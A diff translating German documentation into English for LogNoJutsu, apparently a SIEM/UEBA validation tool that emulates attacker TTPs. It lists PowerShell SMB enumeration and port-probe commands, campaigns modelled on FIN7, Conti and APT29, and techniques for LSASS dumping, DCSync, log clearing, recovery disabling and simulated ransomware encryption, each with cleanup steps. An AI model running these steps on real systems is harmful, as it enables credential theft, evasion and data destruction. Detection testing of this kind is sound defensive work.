 #### UEBA-LATERAL-NEW-ASSET — Lateral Movement + New Asset Access
 
-| Eigenschaft | Wert |
+| Property | Value |
 |---|---|
 | UEBA Use Case | First-Time Asset Access / Lateral Movement (Exabeam Package: Lateral Movement) |
-| Admin erforderlich | Nein |
-| Cleanup | SMB-Verbindung entfernt |
+| Admin Required | No |
+| Cleanup | SMB connection removed |
 
-**Was wird ausgeführt:**
+**What is executed:**
 
 ```powershell
-# Step 1: SMB Admin-Share-Zugriffsversuch (EID 5140 + Sysmon EID 3 auf Port 445)
+# Step 1: SMB admin share access attempt (EID 5140 + Sysmon EID 3 on Port 445)
 net use \\127.0.0.1\C$ 2>&1
 
-# Step 2: Freigaben auf Ziel-Host aufzählen (EID 4688 — net view)
+# Step 2: Enumerate shares on target host (EID 4688 — net view)
 net view \\127.0.0.1 2>&1
 
-# Step 3: Aktive Sessions prüfen (EID 4688 — net session)
+# Step 3: Check active sessions (EID 4688 — net session)
 net session 2>&1
 
-# Step 4: SMB-Port-Probe — Port 445 (Sysmon EID 3 — Netzwerkverbindung)
+# Step 4: SMB port probe — Port 445 (Sysmon EID 3 — network connection)
 $smb = Test-NetConnection -ComputerName 127.0.0.1 -Port 445 -InformationLevel Quiet -WarningAction SilentlyContinue
-Write-Host "SMB Port 445 erreichbar: $smb"
+Write-Host "SMB Port 445 reachable: $smb"
 
-# Step 5: RDP-Port-Probe — Port 3389 (Sysmon EID 3 — Lateral Movement via RDP)
+# Step 5: RDP port probe — Port 3389 (Sysmon EID 3 — lateral movement via RDP)
 $rdp = Test-NetConnection -ComputerName 127.0.0.1 -Port 3389 -InformationLevel Quiet -WarningAction SilentlyContinue
-Write-Host "RDP Port 3389 erreichbar: $rdp"
+Write-Host "RDP Port 3389 reachable: $rdp"
 ```
 
-**UEBA-Erkennungslogik:** Exabeam nutzt ein First-Time-Seen-Modell fuer Hostzugriffe. Wenn ein Benutzer erstmals auf einen internen Host per SMB (Port 445) oder RDP (Port 3389) zugreift wird dies als anomales Verhalten gewertet und erhoht den Session-Risikowert.
+**UEBA detection logic:** Exabeam uses a first-time-seen model for host accesses. When a user accesses an internal host for the first time via SMB (Port 445) or RDP (Port 3389), this is treated as anomalous behavior and increases the session risk score.
 
-**Erwartete SIEM-Events:**
-- `5140` — Netzwerk-Freigabeobjekt aufgerufen: SMB-Share-Zugriffsversuch (Exabeam: neuer Asset-Zugriff)
-- `4688` — `net.exe use/view` — Share-Aufzählung auf Ziel-Host
-- `Sysmon 3` — NetworkConnect: Port 445 SMB-Verbindungsversuch
-- `4624` — Anmelde-Event: Netzwerkanmeldung Typ 3 bei erfolgreichem Share-Zugriff
+**Expected SIEM Events:**
+- `5140` — Network share object accessed: SMB share access attempt (Exabeam: new asset access)
+- `4688` — `net.exe use/view` — share enumeration on target host
+- `Sysmon 3` — NetworkConnect: Port 445 SMB connection attempt
+- `4624` — Logon event: network logon Type 3 on successful share access
 
 ---
 
-## Kampagnen / Playbooks
+## Campaigns / Playbooks
 
-Kampagnen sind geordnete Abfolgen von Techniken, die reale Angreifer-TTPs nachbilden. Sie werden in der Web-UI im Tab "Playbooks" ausgewählt.
+Campaigns are ordered sequences of techniques that replicate real attacker TTPs. They are selected in the web UI in the "Playbooks" tab.
 
-### Übersicht
+### Overview
 
-| Kampagne | Kategorie | Bedrohungsakteur | Schritte |
+| Campaign | Category | Threat Actor | Steps |
 |---|---|---|---|
-| `finance-fin7` | Branche | FIN7 / Carbanak | 10 |
-| `healthcare-ransomware` | Branche | Conti / LockBit | 10 |
-| `manufacturing-apt` | Branche | Sandworm / TEMP.Veles | 11 |
-| `energy-longdwell` | Branche | Volt Typhoon / Dragonfly | 10 |
-| `retail-pos` | Branche | FIN7 POS-Variante | 10 |
-| `government-apt` | Branche | APT29 / APT28 | 14 |
-| `ueba-exabeam-validation` | UEBA | Generisch | 10 |
+| `finance-fin7` | Industry | FIN7 / Carbanak | 10 |
+| `healthcare-ransomware` | Industry | Conti / LockBit | 10 |
+| `manufacturing-apt` | Industry | Sandworm / TEMP.Veles | 11 |
+| `energy-longdwell` | Industry | Volt Typhoon / Dragonfly | 10 |
+| `retail-pos` | Industry | FIN7 POS variant | 10 |
+| `government-apt` | Industry | APT29 / APT28 | 14 |
+| `ueba-exabeam-validation` | UEBA | Generic | 10 |
 | `lateral-movement-credential-theft` | Exabeam Validation | APT Lateral Movement | 9 |
 | `account-manipulation-persistence` | Exabeam Validation | APT Post-Exploitation | 7 |
 | `defense-evasion-lolbin` | Exabeam Validation | Sophisticated APT | 8 |
@@ -2351,62 +2350,62 @@ Kampagnen sind geordnete Abfolgen von Techniken, die reale Angreifer-TTPs nachbi
 
 ---
 
-### Branchen-Kampagnen
+### Industry Campaigns
 
 #### finance-fin7 — Finance / FIN7 Carbanak
-Simuliert die TTPs der FIN7/Carbanak-Gruppe, die auf Finanzinstitute spezialisiert ist. Umfasst Spear-Phishing-Nachfolgeaktionen, PowerShell-Backdoors, Credential Dumping und laterale Bewegung zu Payment-Systemen.
+Simulates the TTPs of the FIN7/Carbanak group, which specializes in financial institutions. Includes spear-phishing follow-up actions, PowerShell backdoors, credential dumping, and lateral movement to payment systems.
 
-Schritte: T1082 → T1087 → T1057 → T1059.001 → T1003.001 → T1021.001 → T1053.005 → T1547.001 → T1562.002 → T1070.001
+Steps: T1082 → T1087 → T1057 → T1059.001 → T1003.001 → T1021.001 → T1053.005 → T1547.001 → T1562.002 → T1070.001
 
 #### healthcare-ransomware — Healthcare / Conti LockBit
-Simuliert Ransomware-Angriffe auf Healthcare-Umgebungen (häufig da Patientendaten kritisch und oft schlecht geschützt). Fokus auf Discovery, Credential-Harvesting, Deaktivierung von Backups und Simulation der Verschlüsselungsphase.
+Simulates ransomware attacks on healthcare environments (common because patient data is critical and often poorly protected). Focus on discovery, credential harvesting, disabling backups, and simulating the encryption phase.
 
-Schritte: T1082 → T1083 → T1087 → T1003.001 → T1059.001 → T1547.001 → T1562.002 → T1490 → T1486 → T1070.001
+Steps: T1082 → T1083 → T1087 → T1003.001 → T1059.001 → T1547.001 → T1562.002 → T1490 → T1486 → T1070.001
 
 #### manufacturing-apt — Manufacturing / Sandworm
-Simuliert APT-Angriffe auf Fertigungsumgebungen (ICS/SCADA-Kontext). Langer Verweildauer (Long Dwell), Service-Installation für Persistence, gezielte System-Discovery.
+Simulates APT attacks on manufacturing environments (ICS/SCADA context). Long dwell time, service installation for persistence, targeted system discovery.
 
-Schritte: T1082 → T1016 → T1049 → T1057 → T1083 → T1087 → T1059.001 → T1543.003 → T1562.002 → T1070.001 → T1490
+Steps: T1082 → T1016 → T1049 → T1057 → T1083 → T1087 → T1059.001 → T1543.003 → T1562.002 → T1070.001 → T1490
 
 #### energy-longdwell — Energy / Volt Typhoon Dragonfly
-Simuliert Long-Dwell-APT-Angriffe auf Energieunternehmen (Kritische Infrastruktur). Charakteristisch: Slow Recon, minimale Footprint-Hinterlasung, Living-off-the-Land.
+Simulates long-dwell APT attacks on energy companies (critical infrastructure). Characteristic: slow recon, minimal footprint, living-off-the-land.
 
-Schritte: T1082 → T1049 → T1016 → T1057 → T1087 → T1083 → T1059.001 → T1547.001 → T1562.002 → T1070.001
+Steps: T1082 → T1049 → T1016 → T1057 → T1087 → T1083 → T1059.001 → T1547.001 → T1562.002 → T1070.001
 
 #### retail-pos — Retail / FIN7 POS
-Simuliert POS-System-Angriffe im Einzelhandel. Fokus auf Credential-Harvesting, Lateral Movement zu POS-Terminals und Persistence.
+Simulates POS system attacks in retail. Focus on credential harvesting, lateral movement to POS terminals, and persistence.
 
-Schritte: T1082 → T1087 → T1057 → T1049 → T1059.001 → T1003.001 → T1547.001 → T1053.005 → T1562.002 → T1070.001
+Steps: T1082 → T1087 → T1057 → T1049 → T1059.001 → T1003.001 → T1547.001 → T1053.005 → T1562.002 → T1070.001
 
 #### government-apt — Government / APT29 APT28
-Simuliert nation-state APT-Angriffe auf Regierungsbehörden (14 Schritte — umfangreichste Branchen-Kampagne). Umfasst vollständige Kill-Chain von Discovery über Credential-Access bis zu Persistence und Defense-Evasion.
+Simulates nation-state APT attacks on government agencies (14 steps — most comprehensive industry campaign). Covers the complete kill chain from discovery through credential access to persistence and defense evasion.
 
-Schritte: T1082 → T1087 → T1069 → T1049 → T1016 → T1057 → T1083 → T1059.001 → T1003.001 → T1547.001 → T1053.005 → T1543.003 → T1562.002 → T1070.001
+Steps: T1082 → T1087 → T1069 → T1049 → T1016 → T1057 → T1083 → T1059.001 → T1003.001 → T1547.001 → T1053.005 → T1543.003 → T1562.002 → T1070.001
 
 ---
 
 ### Exabeam Validation Campaigns
 
-Diese vier Kampagnen sind direkt auf die Exabeam Use Case Library ausgerichtet und testen gezielt die höchsten Regelabdeckungen.
+These four campaigns are directly aligned with the Exabeam Use Case Library and specifically test the highest rule coverages.
 
 #### ueba-exabeam-validation — Exabeam UEBA Validation Suite
-Strukturierte Validierung aller wichtigen Exabeam UEBA-Use-Cases nach dem Onboarding:
+Structured validation of all important Exabeam UEBA use cases after onboarding:
 
 ```
-T1082              → Baseline-Aktivität erzeugen
-T1016              → Baseline-Aktivität erzeugen
+T1082              → Generate baseline activity
+T1016              → Generate baseline activity
 UEBA-OFFHOURS      → Use Case: Abnormal Activity Time
 UEBA-LATERAL-CHAIN → Use Case: First-Time Recon Behavior
 UEBA-SPRAY-CHAIN   → Use Case: Brute Force / Credential Stuffing
-T1053.005          → Anomalie: Neuer Scheduled Task
-T1547.001          → Anomalie: Neuer Registry Run Key
+T1053.005          → Anomaly: New Scheduled Task
+T1547.001          → Anomaly: New Registry Run Key
 T1003.001          → Use Case: Credential Dumping Precursor
 T1562.002          → Use Case: Defense Evasion
 T1070.001          → Use Case: Log Clearing
 ```
 
 #### lateral-movement-credential-theft — Lateral Movement & Credential Theft Chain
-Deckt Exabeam's Lateral Movement Use Case (118 Regeln für T1021) und Credential Access (49 Regeln für T1003) ab. Simuliert den vollständigen Pfad von initialer Enumeration über Kerberoasting bis zum DCSync-Recon.
+Covers Exabeam's Lateral Movement use case (118 rules for T1021) and Credential Access (49 rules for T1003). Simulates the complete path from initial enumeration through Kerberoasting to DCSync recon.
 
 ```
 T1087  → Account Discovery
@@ -2421,7 +2420,7 @@ T1003.006 → DCSync Recon
 ```
 
 #### account-manipulation-persistence — Account Manipulation & Persistence
-Deckt Exabeam's Account Manipulation Use Case direkt ab (T1098 = 57 Regeln, T1136 = 35 Regeln). Validiert alle wichtigen Persistence-Mechanismen in einer Kampagne.
+Directly covers Exabeam's Account Manipulation use case (T1098 = 57 rules, T1136 = 35 rules). Validates all important persistence mechanisms in one campaign.
 
 ```
 T1136.001  → Create Local Account (Event 4720)
@@ -2434,7 +2433,7 @@ T1546.003  → WMI Event Subscription (Sysmon 19/20/21)
 ```
 
 #### defense-evasion-lolbin — Defense Evasion & LOLBin
-Deckt Exabeam's Evasion Use Case ab. Fokus auf Living-off-the-Land-Binaries (LOLBins) und Obfuskationstechniken. T1218 hat 116 Exabeam-Regeln — die zweithöchste Abdeckung nach T1078.
+Covers Exabeam's Evasion use case. Focus on Living-off-the-Land binaries (LOLBins) and obfuscation techniques. T1218 has 116 Exabeam rules — the second-highest coverage after T1078.
 
 ```
 T1027      → Obfuscated/Encoded Commands (4104)
@@ -2448,7 +2447,7 @@ T1070.001  → Clear Logs (wevtutil)
 ```
 
 #### ransomware-full-chain — Ransomware Full Attack Chain
-Simuliert eine vollständige Ransomware Kill-Chain von Discovery bis zur Simulation der Verschlüsselungsphase. Deckt alle dokumentierten Exabeam Ransomware-Correlation-Rules ab (bcdedit, vssadmin, Massenumbenennung).
+Simulates a complete ransomware kill chain from discovery to simulation of the encryption phase. Covers all documented Exabeam Ransomware Correlation Rules (bcdedit, vssadmin, mass renaming).
 
 ```
 T1082      → System Discovery
@@ -2464,7 +2463,7 @@ T1070.001  → Clear Logs (post-encryption cleanup)
 ```
 
 #### insider-threat — Insider Threat Simulation
-Simuliert einen böswilligen Insider (z.B. ausscheidenden Mitarbeiter) bei Daten-Exfiltrations-Vorbereitung. Richtet sich an Exabeam's Malicious Insider Package. **Empfohlen: Mit einem dedizierten Benutzerprofil ausführen (User Rotation), um authentische UEBA-Verhaltensanomalien zu erzeugen.**
+Simulates a malicious insider (e.g., a departing employee) during data exfiltration preparation. Targets Exabeam's Malicious Insider Package. **Recommended: Run with a dedicated user profile (User Rotation) to generate authentic UEBA behavioral anomalies.**
 
 ```
 T1082      → System Discovery
@@ -2480,25 +2479,25 @@ T1070.001  → Log Clearing (covering tracks)
 
 ---
 
-## Logging und Reporting
+## Logging and Reporting
 
-### Simulations-Log (`.log`)
+### Simulation Log (`.log`)
 
-Für jede Simulation wird eine Textdatei im Format `lognojutsu_YYYYMMDD_HHMMSS_[Kampagne].log` im selben Verzeichnis wie die `.exe` erstellt.
+For each simulation, a text file is created in the format `lognojutsu_YYYYMMDD_HHMMSS_[campaign].log` in the same directory as the `.exe`.
 
-| Log-Typ | Beschreibung |
+| Log Type | Description |
 |---|---|
-| `SIM_START` | Simulationsstart mit Konfigurationsdetails |
-| `PHASE` | Phasenwechsel (Discovery / Attack / Cleanup) |
-| `TECH_START` | Beginn einer Technik (ID, Name, Taktik) |
-| `COMMAND` | Ausgeführter Befehl (Executor-Typ + Kommandozeile) |
-| `OUTPUT` | Komplette stdout-Ausgabe der Technik |
-| `ERROR` | stderr-Ausgabe (falls vorhanden) |
-| `CLEANUP` | Ausgeführter Cleanup-Befehl und Ergebnis |
-| `TECH_END` | Abschluss der Technik mit Dauer und Erfolgsstatus |
-| `SIM_END` | Zusammenfassung (X/Y Techniken erfolgreich) |
+| `SIM_START` | Simulation start with configuration details |
+| `PHASE` | Phase change (Discovery / Attack / Cleanup) |
+| `TECH_START` | Start of a technique (ID, name, tactic) |
+| `COMMAND` | Executed command (executor type + command line) |
+| `OUTPUT` | Complete stdout output of the technique |
+| `ERROR` | stderr output (if present) |
+| `CLEANUP` | Executed cleanup command and result |
+| `TECH_END` | Completion of the technique with duration and success status |
+| `SIM_END` | Summary (X/Y techniques successful) |
 
-**Beispiel-Log-Ausschnitt:**
+**Example log excerpt:**
 ```
 [2026-03-21 22:00:00.000] [SIM_START   ] === LogNoJutsu Simulation Started ===
 [2026-03-21 22:00:00.001] [INFO        ] Configuration: rotation=sequential profiles=2
@@ -2509,123 +2508,123 @@ Für jede Simulation wird eine Textdatei im Format `lognojutsu_YYYYMMDD_HHMMSS_[
 [2026-03-21 22:00:01.210] [TECH_END    ] [END] T1082 — SUCCESS ✓ (1.207s)
 ```
 
-### JSON-Report (`.json`)
+### JSON Report (`.json`)
 
-Zusätzlich wird `lognojutsu_report_YYYYMMDD_HHMMSS.json` erstellt:
-- Gesamtstatistik: Gesamt / Erfolgreich / Fehlgeschlagen
-- Pro Technik: ID, Name, Taktik, Start/Ende, Success, Stdout, Stderr, Cleanup-Status, ausführender Benutzer (`run_as_user`)
+Additionally, `lognojutsu_report_YYYYMMDD_HHMMSS.json` is created:
+- Overall statistics: Total / Successful / Failed
+- Per technique: ID, name, tactic, start/end, success, stdout, stderr, cleanup status, executing user (`run_as_user`)
 
-### HTML-Report (`.html`)
+### HTML Report (`.html`)
 
-Nach jeder Simulation wird zusätzlich `lognojutsu_report_YYYYMMDD_HHMMSS.html` generiert — ein vollständiger Simulationsbericht im Dark-Theme-Format:
+After each simulation, `lognojutsu_report_YYYYMMDD_HHMMSS.html` is additionally generated — a complete simulation report in dark theme format:
 
-| Abschnitt | Inhalt |
+| Section | Content |
 |---|---|
-| **Summary-Grid** | 4 Kacheln: Gesamttechniken / Erfolgreich / Fehlgeschlagen / Dauer |
-| **Taktik-Heatmap** | Pro ATT&CK-Taktik: Anzahl Techniken + Erfolgsrate als farbiger Balken |
-| **Ergebnistabelle** | Jede Technik mit ID, Taktik, ausführendem Benutzer, Dauer, Erfolg/Fehler, Output-Excerpt |
-| **WhatIf-Badge** | Sichtbarer Hinweis wenn Simulation im WhatIf-Modus ausgeführt wurde |
+| **Summary Grid** | 4 tiles: Total techniques / Successful / Failed / Duration |
+| **Tactic Heatmap** | Per ATT&CK tactic: number of techniques + success rate as colored bar |
+| **Results Table** | Each technique with ID, tactic, executing user, duration, success/failure, output excerpt |
+| **WhatIf Badge** | Visible indicator when simulation was run in WhatIf mode |
 
-**Zugriff:**
-- Datei direkt im Arbeitsverzeichnis öffnen
-- In der Web-UI: Tab "Results" → Button **"HTML Report öffnen"** (erscheint nach Simulation)
-- API: `GET /api/report` — liefert den letzten HTML-Report inline
+**Access:**
+- Open file directly in the working directory
+- In the web UI: Tab "Results" → Button **"Open HTML Report"** (appears after simulation)
+- API: `GET /api/report` — returns the last HTML report inline
 
 ---
 
-## Cleanup-Mechanismus
+## Cleanup Mechanism
 
-### Techniken mit Cleanup
+### Techniques with Cleanup
 
-| Technik | Angelegtes Artefakt | Cleanup |
+| Technique | Created Artifact | Cleanup |
 |---|---|---|
-| T1136.001 | Lokaler Account `lnj_test_acct` | `net user lnj_test_acct /delete` |
-| T1098 | Account in Administrators-Gruppe | Gruppen-Mitgliedschaft + Account entfernt |
-| T1547.001 | Registry-Key `HKCU\...\Run\LogNoJutsu_Persistence_Test` | Registry-Eintrag gelöscht |
-| T1053.005 | Scheduled Task `LogNoJutsu_Task_Test` | Task deregistriert |
-| T1543.003 | Windows Service `LogNoJutsuTestSvc` | Service gelöscht |
-| T1548.002 | Registry-Key `HKCU\Software\Classes\mscfile\...` | Registry-Tree entfernt |
-| T1197 | BITS-Job `LogNoJutsu_BITS_Test` | Job abgebrochen |
-| T1546.003 | WMI Filter, Consumer, Binding | Alle drei WMI-Objekte entfernt |
-| T1036.005 | Temporäre Binärdateien in `%TEMP%\LNJ_Masq\` + Run-Key | Verzeichnis + Registry entfernt |
-| T1486 | AES-verschlüsselte Dateien + Ransom-Note in `%TEMP%\LNJ_T1486\` | Verzeichnis entfernt |
-| T1490 | Boot-Recovery deaktiviert, SystemRestore-Registry | bcdedit wiederhergestellt, Keys entfernt |
-| T1562.002 | Audit-Policy deaktiviert, wevtutil Kanäle, MaxSize-Registry | Backup-Restore + Kanäle reaktiviert |
-| T1550.002 | Netzwerkverbindungen via `net use` | `net use * /delete` |
+| T1136.001 | Local account `lnj_test_acct` | `net user lnj_test_acct /delete` |
+| T1098 | Account in Administrators group | Group membership + account removed |
+| T1547.001 | Registry key `HKCU\...\Run\LogNoJutsu_Persistence_Test` | Registry entry deleted |
+| T1053.005 | Scheduled task `LogNoJutsu_Task_Test` | Task deregistered |
+| T1543.003 | Windows service `LogNoJutsuTestSvc` | Service deleted |
+| T1548.002 | Registry key `HKCU\Software\Classes\mscfile\...` | Registry tree removed |
+| T1197 | BITS job `LogNoJutsu_BITS_Test` | Job cancelled |
+| T1546.003 | WMI Filter, Consumer, Binding | All three WMI objects removed |
+| T1036.005 | Temporary binaries in `%TEMP%\LNJ_Masq\` + Run key | Directory + registry removed |
+| T1486 | AES-encrypted files + ransom note in `%TEMP%\LNJ_T1486\` | Directory removed |
+| T1490 | Boot recovery disabled, SystemRestore registry | bcdedit restored, keys removed |
+| T1562.002 | Audit policy disabled, wevtutil channels, MaxSize registry | Backup restore + channels reactivated |
+| T1550.002 | Network connections via `net use` | `net use * /delete` |
 
-### Cleanup-Modi
+### Cleanup Modes
 
-**Modus 1 — Per-Technik-Cleanup (Standard, Checkbox aktiv):**
-Nach jeder Technik wird sofort der zugehörige Cleanup ausgeführt. Artefakte existieren nur während der Technik-Ausführung.
+**Mode 1 — Per-Technique Cleanup (Default, checkbox active):**
+After each technique, the associated cleanup is executed immediately. Artifacts only exist during technique execution.
 
-**Modus 2 — End-of-Simulation-Cleanup (Checkbox inaktiv):**
-Alle Artefakte bleiben während der gesamten Simulation bestehen und werden gesammelt am Ende entfernt. Sinnvoll, wenn das SIEM auch die Persistenz-Erkennung über Zeit testen soll.
+**Mode 2 — End-of-Simulation Cleanup (Checkbox inactive):**
+All artifacts remain throughout the entire simulation and are removed collectively at the end. Useful when the SIEM should also test persistence detection over time.
 
-**Modus 3 — Abbruch-Cleanup (Stop & Cleanup Button):**
-Wird die Simulation manuell abgebrochen, wird automatisch ein vollständiger Cleanup aller bis dahin ausgeführten Techniken durchgeführt.
+**Mode 3 — Abort Cleanup (Stop & Cleanup button):**
+If the simulation is manually aborted, a complete cleanup of all techniques executed so far is automatically performed.
 
 ---
 
-## SIEM-Plattform-spezifische Voraussetzungen
+## SIEM Platform-Specific Prerequisites
 
 ### Microsoft Sentinel
 
-LogNoJutsu enthalt Techniken mit dem Prafix `AZURE_`, die gezielt Windows Security Events erzeugen, welche von Microsoft Sentinels integrierten Analytic Rules erkannt werden. Diese Techniken laufen lokal auf dem Windows-System — keine Azure-Konnektivitat zur Laufzeit erforderlich.
+LogNoJutsu includes techniques with the `AZURE_` prefix that specifically generate Windows Security Events recognized by Microsoft Sentinel's built-in Analytic Rules. These techniques run locally on the Windows system — no Azure connectivity is required at runtime.
 
-**Voraussetzungen:**
+**Prerequisites:**
 
-| Komponente | Beschreibung |
+| Component | Description |
 |------------|-------------|
-| Azure Monitor Agent (AMA) | Auf dem Testsystem installiert und mit dem Log Analytics Workspace verbunden. MMA (Log Analytics Agent) wird ebenfalls unterstutzt, ist aber von Microsoft als deprecated markiert. |
-| Windows Security Events Connector | In Microsoft Sentinel aktiviert — leitet Security-Channel-Events (4662, 4688, 4769) an die SecurityEvent-Tabelle weiter |
-| Analytic Rules | Folgende Built-in-Regeln mussen in Sentinel aktiviert sein: |
+| Azure Monitor Agent (AMA) | Installed on the test system and connected to the Log Analytics Workspace. MMA (Log Analytics Agent) is also supported but has been marked as deprecated by Microsoft. |
+| Windows Security Events Connector | Enabled in Microsoft Sentinel — forwards Security channel events (4662, 4688, 4769) to the SecurityEvent table |
+| Analytic Rules | The following built-in rules must be enabled in Sentinel: |
 
-**Empfohlene Sentinel Analytic Rules:**
+**Recommended Sentinel Analytic Rules:**
 
-- **Potential Kerberoasting** — erkennt Bulk-TGS-Anfragen mit RC4-Verschlusselung (EID 4769, EncryptionType=0x17)
-- **Non Domain Controller Active Directory Replication** — erkennt Replikationsanfragen von Nicht-DC-Systemen (EID 4662 mit DS-Replication GUIDs)
-- **Dumping LSASS Process Into a File** — erkennt LSASS-Speicherzugriffe (EID 4656/4663)
+- **Potential Kerberoasting** — detects bulk TGS requests with RC4 encryption (EID 4769, EncryptionType=0x17)
+- **Non Domain Controller Active Directory Replication** — detects replication requests from non-DC systems (EID 4662 with DS-Replication GUIDs)
+- **Dumping LSASS Process Into a File** — detects LSASS memory accesses (EID 4656/4663)
 
-**AZURE_-Techniken:**
+**AZURE_ Techniques:**
 
-| Technik | MITRE ATT&CK | Sentinel Analytic Rule | Primar-Event |
+| Technique | MITRE ATT&CK | Sentinel Analytic Rule | Primary Event |
 |---------|-------------|----------------------|-------------|
 | AZURE_kerberoasting | T1558.003 | Potential Kerberoasting | EID 4769 |
 | AZURE_ldap_recon | T1087.002 | Anomalous LDAP Activity | EID 4688 |
 | AZURE_dcsync | T1003.006 | Non Domain Controller Active Directory Replication | EID 4662 |
 
-> **Hinweis:** Die AZURE_-Techniken benotigen ein domainverbundenes Windows-System mit Active Directory. Auf Standalone-Systemen werden die AD-bezogenen Events nicht generiert.
+> **Note:** The AZURE_ techniques require a domain-joined Windows system with Active Directory. On standalone systems, the AD-related events are not generated.
 
 ---
 
-## Kommandozeilen-Optionen
+## Command-Line Options
 
 ```
-lognojutsu.exe [Optionen]
+lognojutsu.exe [options]
 
-Optionen:
+Options:
   -host string
-        Bind-Adresse für den HTTP-Server (Standard: "127.0.0.1")
-        Für Netzwerkzugriff: 0.0.0.0
+        Bind address for the HTTP server (default: "127.0.0.1")
+        For network access: 0.0.0.0
 
   -port int
-        HTTP-Port (Standard: 8080)
+        HTTP port (default: 8080)
 
   -password string
-        Optionales Passwort für die Web-UI (HTTP Basic Auth)
-        Leer lassen = keine Authentifizierung
+        Optional password for the web UI (HTTP Basic Auth)
+        Leave empty = no authentication
 
-Beispiele:
+Examples:
   lognojutsu.exe
-        Startet mit Standard-Einstellungen (nur localhost, Port 8080)
+        Starts with default settings (localhost only, port 8080)
 
   lognojutsu.exe -host 0.0.0.0 -port 9090
-        Erreichbar im gesamten Netzwerk auf Port 9090
+        Accessible on the entire network on port 9090
 
   lognojutsu.exe -host 0.0.0.0 -password "Simulation2026!"
-        Netzwerkzugriff mit Passwortschutz
+        Network access with password protection
 ```
 
 ---
 
-*LogNoJutsu ist ein Werkzeug ausschließlich für autorisierte SIEM-Validierung in kontrollierten Testumgebungen. Der Einsatz auf Systemen ohne ausdrückliche Genehmigung ist unzulässig.*
+*LogNoJutsu is a tool exclusively for authorized SIEM validation in controlled test environments. Use on systems without explicit authorization is prohibited.*
